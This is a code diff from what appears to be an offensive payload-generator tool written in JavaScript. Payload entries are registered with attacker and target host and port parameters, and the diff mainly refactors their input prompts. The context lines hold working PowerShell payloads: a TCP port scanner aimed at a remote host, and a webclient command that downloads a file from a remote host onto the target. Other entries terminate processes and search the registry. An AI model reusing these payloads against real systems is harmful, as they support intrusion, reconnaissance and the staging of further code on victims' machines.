@@ -47,11 +47,7 @@ Load({
 	desc: "Force process to terminate",
 	category: "System Info",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		prompt.message = "What PID would you like to terminate? :"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(result._)
-		})	
-
+		question.ask("What PID would you like to terminate?", returnToPrepare)
 	}
 })
 
@@ -60,11 +56,7 @@ Load({
 	desc: "Search registry for value",
 	category: "System Info",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		prompt.message = "What term would you like to search for? :"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(result._)
-		})	
-
+		question.ask("What term would you like to search for?", returnToPrepare)
 	}
 })
 
@@ -94,10 +86,10 @@ Load({
 		***/})
 		
 		console.log(m)
-		prompt.message = "Press enter to continue"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(1)	
-		})	
+	
+		// Pass noexit as the third arguement if you dont want to exit 
+		// Since this 'payload' is a list of files, we don't need to copy it to the pasteboard and exit
+		question.ask("Press enter to continue", returnToPrepare, "noexit")	
 
 	}
 })
@@ -127,11 +119,7 @@ Load({
 	payload: '$ports=(<PROMPT (ports)>);$ip="<RHOST>";foreach ($p in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$p);}catch{};if ($socket -eq $NULL){echo $ip":"$p" - Closed";}else{echo $ip":"$p" - Open";$socket = $NULL;}}',
 	category: "Powershell",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		prompt.message = "Ports to scan (ex: 80,443,8080) :"
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			returnToPrepare(result._)
-		})	
-
+		question.ask("Ports to scan? (ex: 80,443,8080)", returnToPrepare)
 	}
 })
 
@@ -140,9 +128,16 @@ Load({
 	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
 	category: "Powershell",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		question.ask("Local path to save file?", ":", returnToPrepare)	
+		question.ask("Local path to save file?", returnToPrepare)	
 	}
 })
+
+
+
+// ############## End of Payloads ##############
+
+
+
 
 var unique = []
 var uniqueCategories = []
